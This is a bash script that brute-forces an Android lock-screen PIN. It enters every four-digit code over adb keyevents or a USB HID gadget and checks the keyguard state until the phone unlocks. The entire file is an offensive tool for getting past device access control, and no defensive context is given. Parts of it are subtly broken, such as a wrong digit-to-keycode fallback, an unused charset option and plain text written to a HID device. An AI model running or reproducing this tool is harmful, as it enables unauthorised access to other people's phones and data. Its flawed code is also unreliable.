#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'

G='\033[38;5;82m'; R='\033[38;5;196m'; Y='\033[38;5;226m'; C='\033[38;5;51m'; B='\033[1m'; D='\033[2m'; NC='\033[0m'

log() { echo -e "${C}[*]${NC} ${B}$1${NC}"; }
ok()  { echo -e "${G}[+]${NC} ${B}$1${NC}"; }
warn() { echo -e "${Y}[!]${NC} ${B}$1${NC}"; }
err() { echo -e "${R}[x]${NC} ${B}$1${NC}"; }

MIN="${1:-0000}"
MAX="${2:-9999}"
CHARSET="${3:-numeric}"
DELAY="${4:-1}"
METHOD="${5:-adb}"
SERIAL="${6:-}"
OUTPUT=()

ADB="adb"
[[ -n "$SERIAL" ]] && ADB="adb -s $SERIAL"

$ADB get-state 2>/dev/null | grep -q device || {
  err "Device not connected"
  echo '{"status":"failed","output":["Device not connected"]}'
  exit 1
}

log "PIN bruteforce from $MIN to $MAX (delay: ${DELAY}s, method: $METHOD)"

if [[ "$METHOD" == "adb" ]]; then
  $ADB shell dumpsys window 2>/dev/null | grep -q mKeyguard || warn "Cannot detect lock screen"
fi

for ((i=10#$MIN; i<=10#$MAX; i++)); do
  PIN=$(printf "%04d" $i)
  echo -ne "\r  ${D}Testing PIN: $PIN${NC}  "

  case "$METHOD" in
    adb)
      $ADB shell input keyevent KEYCODE_HOME 2>/dev/null || true
      sleep 0.3
      $ADB shell input keyevent KEYCODE_WAKEUP 2>/dev/null || true
      sleep 0.3
      for ((j=0; j<${#PIN}; j++)); do
        DIGIT="${PIN:$j:1}"
        case "$DIGIT" in
          0) KEY=7;; 1) KEY=8;; 2) KEY=9;; 3) KEY=10;;
          4) KEY=11;; 5) KEY=12;; 6) KEY=13;; 7) KEY=14;;
          8) KEY=15;; 9) KEY=16;;
        esac
        $ADB shell input keyevent "KEYCODE_NUMPAD_$DIGIT" 2>/dev/null || $ADB shell input keyevent "KEYCODE_$((KEY+7))" 2>/dev/null || true
      done
      $ADB shell input keyevent KEYCODE_ENTER 2>/dev/null || true
      ;;
    hid)
      echo "$PIN" > /dev/hidg0 2>/dev/null && echo -ne "\r\0\0\0\0\0\0\0\0" > /dev/hidg0 2>/dev/null || true
      ;;
  esac

  sleep "$DELAY"

  $ADB shell dumpsys window 2>/dev/null | grep -q 'mKeyguard=false' && {
    ok "PIN found: $PIN"
    OUTPUT+=("PIN: $PIN")
    echo
    echo "{\"status\":\"success\",\"output\":[\"PIN found: $PIN\"]}"
    exit 0
  }
done

warn "PIN not found in range $MIN-$MAX"
echo "{\"status\":\"failed\",\"output\":[\"PIN not found\"]}"
exit 1
